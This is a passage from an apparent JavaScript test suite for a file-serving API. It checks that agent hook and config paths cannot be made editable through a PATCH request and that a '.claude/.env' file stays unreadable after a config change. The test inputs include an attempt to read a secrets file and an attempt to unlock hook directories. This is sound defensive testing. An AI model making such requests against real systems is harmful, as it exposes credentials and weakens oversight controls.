    it('never-editable paths cannot be enabled via PATCH', async () => {
      // Try to make hooks editable via config update
      const res = await request(baseUrl, 'PATCH', '/api/files/config', {
        editablePaths: ['.claude/hooks/', '.claude/config/'],
      }, { 'x-instar-request': '1' });
      expect(res.status).toBe(400);
      expect(res.body.error).toContain('never editable');
    });

    it('blocked filenames remain blocked even after config update', async () => {
      // Add a path that contains .env files
      await request(baseUrl, 'PATCH', '/api/files/config', {
        allowedPaths: ['.claude/', 'docs/'],
      }, { 'x-instar-request': '1' });

      // .env should still be blocked
      const res = await request(baseUrl, 'GET', '/api/files/read?path=.claude/.env');
      expect(res.status).toBe(403);
    });
  });
});
